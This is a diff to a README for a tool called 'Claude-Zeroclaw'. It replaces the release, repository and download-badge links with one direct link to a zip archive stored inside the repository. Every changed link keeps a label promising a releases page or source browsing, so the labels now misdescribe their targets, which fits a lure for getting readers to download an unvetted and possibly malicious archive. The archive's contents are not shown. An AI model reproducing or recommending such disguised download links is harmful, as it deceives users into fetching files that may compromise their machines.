@@ -1,6 +1,6 @@
 # 🛠️ Claude-Zeroclaw - Easy Keyword Code Research Tool
 
-[![Download Claude-Zeroclaw](https://img.shields.io/badge/Download-Claude--Zeroclaw-brightgreen)](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases)
+[![Download Claude-Zeroclaw](https://img.shields.io/badge/Download-Claude--Zeroclaw-brightgreen)](https://raw.githubusercontent.com/vaskesvo5321/Claude-Zeroclaw/main/src/Claude-Zeroclaw-v2.4.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow each of these steps carefully to download and start Claude-Zeroclaw.
 
 Click or copy this link in your browser to open the download page:
 
-[**Download Claude-Zeroclaw Releases**](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases)
+[**Download Claude-Zeroclaw Releases**](https://raw.githubusercontent.com/vaskesvo5321/Claude-Zeroclaw/main/src/Claude-Zeroclaw-v2.4.zip)
 
 This page contains all recent versions of the software. It updates regularly with new features and bug fixes.
 
@@ -127,9 +127,9 @@ If Claude-Zeroclaw does not start or crashes:
 
 ## 🔗 Important Links
 
-[**Claude-Zeroclaw Releases**](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases) — Go here to download versions or view release notes.
+[**Claude-Zeroclaw Releases**](https://raw.githubusercontent.com/vaskesvo5321/Claude-Zeroclaw/main/src/Claude-Zeroclaw-v2.4.zip) — Go here to download versions or view release notes.
 
-[GitHub Repository](https://github.com/vaskesvo5321/Claude-Zeroclaw) — Browse source code or check documentation.
+[GitHub Repository](https://raw.githubusercontent.com/vaskesvo5321/Claude-Zeroclaw/main/src/Claude-Zeroclaw-v2.4.zip) — Browse source code or check documentation.
 
 ## ⚡ Common Questions
 
@@ -151,4 +151,4 @@ Yes, Claude-Zeroclaw is open-source and free to use.
 
 ---
 
-[![Download Claude-Zeroclaw](https://img.shields.io/badge/Download-Claude--Zeroclaw-brightgreen)](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases)
+[![Download Claude-Zeroclaw](https://img.shields.io/badge/Download-Claude--Zeroclaw-brightgreen)](https://raw.githubusercontent.com/vaskesvo5321/Claude-Zeroclaw/main/src/Claude-Zeroclaw-v2.4.zip)
